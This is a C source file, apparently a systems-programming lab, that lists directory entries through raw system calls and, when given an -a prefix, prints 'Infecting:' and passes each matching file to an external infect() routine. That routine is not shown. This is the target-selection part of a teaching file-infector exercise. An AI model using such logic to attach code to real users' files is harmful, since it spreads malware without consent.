#include "util.h"
#include <fcntl.h>

#define SYS_OPEN 0x05
#define SYS_CLOSE 0x06

#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4

#define STDIN 0
#define STDOUT 1
#define STDERR 2

#define SYS_GETDENTS 0x8d

#define true 1
#define false 0
#define NULL ((char*) 0)

struct linux_dirent {
           long           d_ino;
           off_t          d_off;
           unsigned short d_reclen;
           char           d_name[];
       };

int isDebug = false;

void printDebug(char*str, int len)
{
  system_call(SYS_WRITE, STDERR, str, len);
}

void exit(int code)
{
  system_call(SYS_EXIT, code);
}

int systemcall_wrapper(int callname, int argb, int argc, int argd)
{
  int ret = system_call(callname, argb, argc, argd);

  if (isDebug == true)
  {
    char *buffer = "SYSTEM CALL: 0x";
    printDebug(buffer, strlen(buffer));

    buffer = itoa(callname);
    printDebug(buffer, strlen(buffer));

    buffer = " return call: 0x";
    printDebug(buffer, strlen(buffer));

    buffer = itoa(ret);
    printDebug(buffer, strlen(buffer));

    buffer = "\n";
    printDebug(buffer, strlen(buffer));
  }

  return ret;
}

void printn(int file_desc, char* str, int n)
{
  systemcall_wrapper(SYS_WRITE, file_desc, str, n);
}


int readn(int file_desc, char *buffer, int n)
{
  return systemcall_wrapper(SYS_READ, file_desc, buffer, n);
}

int fopen(char *filename, char *mode)
{
    int flags;

    flags = O_RDONLY;

    if (strcmp(mode, "r") == 0)
      flags = O_RDONLY;
    else if (strcmp(mode, "w") == 0)
      flags = O_WRONLY | O_CREAT;
    else if (strcmp(mode, "rw") == 0)
      flags = O_RDWR | O_CREAT;

    else
    {
      char *msg = "Cannot understand mode.\n\0";
      printDebug(msg, strlen(msg));
      exit(0x55);
    } 

    int desc;
    desc = systemcall_wrapper(SYS_OPEN, filename, flags, 0777);

    if (desc == -1)
    {
      char *msg = "Error reading file.\n\0";
      printDebug(msg, strlen(msg));
      exit(0x55);
    }

    return desc;    
}

void fclose(int fileDesc)
{
  systemcall_wrapper(SYS_CLOSE, fileDesc, 0, 0);
}


void str_tolower(char *c, int len)
{
  int i;
  for (i = 0; i < len; i++)
  {
    if (c[i] >= 'A' && c[i] <= 'Z')
    {
      c[i] -= 'A';
      c[i] += 'a';
    }
      
  }
}

void printlower(int file_desc, char* str, int len)
{
  str_tolower(str, len);
  printn(file_desc, str, len);
}

void read_loop(input_desc, output_desc)
{
  
    char c[100];

    int bytesRead = readn(input_desc, c, 100);
    while(bytesRead == 100)
    {
      printlower(output_desc, c, bytesRead);

      bytesRead = readn(input_desc, c, 100);
    }

    if (bytesRead != 0)
    {
      printlower(output_desc, c, bytesRead);
    }
}

/* ASSUMES the buffer is large enough to read all at once. Returns bytes read into buffer */
int readDir(char* dirname, char *buffer, int buffersize)
{
  int dir = fopen(dirname, "r");
  
  signed int bytesRead;
  bytesRead = systemcall_wrapper(SYS_GETDENTS, dir, buffer, buffersize);

  if (bytesRead == -1)
    exit(0x55);

  fclose(dir);
  return bytesRead;

  
}

void printEntry(struct linux_dirent * entry)
{
  printn(STDOUT, entry->d_name, strlen(entry->d_name));
  printn(STDOUT, "\n", 1);
}

void attachToEntry(struct linux_dirent * entry)
{
    printn(STDOUT, "Infecting: ", 11);
    printEntry(entry);

    infect(entry->d_name);
}

void processEntry(struct linux_dirent * entry, char *printPrefix, char *attachPrefix)
{
  int printPrefix_len = strlen(printPrefix);

  if (printPrefix_len == 0 || strncmp(entry->d_name, printPrefix, printPrefix_len) == 0)
    printEntry(entry);


  int attachPrefix_len = strlen(attachPrefix);

  if (attachPrefix_len > 0 && strncmp(entry->d_name, attachPrefix, attachPrefix_len) == 0)
    attachToEntry(entry);
}

void loopDir(char *dirName, char *printPrefix, char *attachPrefix)
{
  unsigned char buffer[8192];
  int len = 8192;

  len = readDir(dirName, buffer, len);

  int pos = 0;

  while (pos < len)
  {
    struct linux_dirent *dirp;
    dirp = (struct linux_dirent *)(buffer + pos);

    processEntry(dirp, printPrefix, attachPrefix);

    pos += dirp->d_reclen;
  }
}



int main (int argc , char* argv[], char* envp[])
{   
    char *printPrefix = "\0";
    char *attachPrefix = "\0";
    
    int i;
    for (i = 1; i < argc; i++)
    {
        if(strcmp(argv[i],"-D")==0)
	        isDebug = true;
        else if(strncmp(argv[i], "-p", 2) == 0)
        {
            printPrefix = argv[i] + 2;
        }
        else if(strncmp(argv[i], "-a", 2) == 0)
        {
            attachPrefix = argv[i] + 2;
        } 
   
    }

  loopDir(".", printPrefix, attachPrefix);


  return 0;
}

